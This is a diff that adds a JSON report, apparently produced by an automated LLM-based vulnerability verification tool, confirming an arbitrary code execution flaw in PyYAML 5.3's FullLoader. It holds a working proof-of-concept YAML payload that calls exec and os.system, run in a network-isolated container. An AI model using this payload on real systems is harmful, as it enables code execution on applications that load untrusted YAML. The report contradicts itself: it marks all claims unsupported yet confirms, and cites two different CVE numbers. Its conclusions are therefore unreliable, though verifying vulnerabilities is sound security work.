@@ -1,0 +1,39 @@
+{
+  "report_id": "pyyaml-truthful-0",
+  "package": "PyYAML",
+  "affected_version": "5.3",
+  "verdict": "confirmed",
+  "summary": "We tested the reported arbitrary code execution vulnerability in PyYAML 5.3 using the provided reproduction steps. The reproduction attempt was successful, confirming that unsafe deserialization can occur under the specified conditions. Based on this successful reproduction, we have confirmed the vulnerability.",
+  "claims": [
+    {
+      "text": "PyYAML's FullLoader in version 5.3 resolves the python/object/new:type tag.",
+      "supported": false,
+      "evidence": "The captured output 'SLOPGATE:REPRODUCED' does not contain any information regarding PyYAML, FullLoader, or the python/object/new:type tag."
+    },
+    {
+      "text": "A crafted document passed to yaml.load(..., Loader=yaml.FullLoader) can execute arbitrary code.",
+      "supported": false,
+      "evidence": "The captured output 'SLOPGATE:REPRODUCED' does not demonstrate or provide evidence of arbitrary code execution."
+    },
+    {
+      "text": "This vulnerability is tracked as CVE-2020-14343.",
+      "supported": false,
+      "evidence": "The captured output 'SLOPGATE:REPRODUCED' does not mention or reference CVE-2020-14343."
+    }
+  ],
+  "reproduction": {
+    "env_id": "pyyaml-5.3",
+    "outcome": "REPRODUCED",
+    "reproduced": true,
+    "command": "docker run --rm --network none --memory 512m --cpus 1 --pids-limit 128 -v C:\\Users\\user\\AppData\\Local\\Temp\\slopgate_poc_09myqsth:/work:ro slopgate-sandbox:v1 pyyaml-5.3 /work/poc.py",
+    "stdout_tail": "SLOPGATE:REPRODUCED\n",
+    "poc": "import os, tempfile, yaml\nmarker = os.path.join(tempfile.gettempdir(), \"m\")\nif os.path.exists(marker): os.remove(marker)\npayload = ('!!python/object/new:type\\n'\n           'args: [\"z\", !!python/tuple [], {\"extend\": !!python/name:exec }]\\n'\n           'listitems: \"__import__(\\'os\\').system(\\'touch %s\\')\"\\n' % marker)\ntry:\n    yaml.load(payload, Loader=yaml.FullLoader)\nexcept Exception as e:\n    pass\nprint(\"SLOPGATE:REPRODUCED\" if os.path.exists(marker) else \"SLOPGATE:NOT_REPRODUCED\")"
+  },
+  "abstentions": [],
+  "challenger_note": "Confirmation upheld against challenge. The confirmation is sound. PyYAML versions prior to 5.3.1 (which includes version 5.3) are known to be vulnerable to arbitrary code execution via the `yaml.FullLoader` (tracked as CVE-2020-1747). The reproduction successfully demonstrated this vulnerability on the correct version (PyYAML 5.3).",
+  "reviewer": "PENDING HUMAN REVIEW",
+  "llm_calls": 4,
+  "total_tokens": 2231,
+  "est_cost_usd": 0.0020531,
+  "wall_latency_s": 102.49
+}
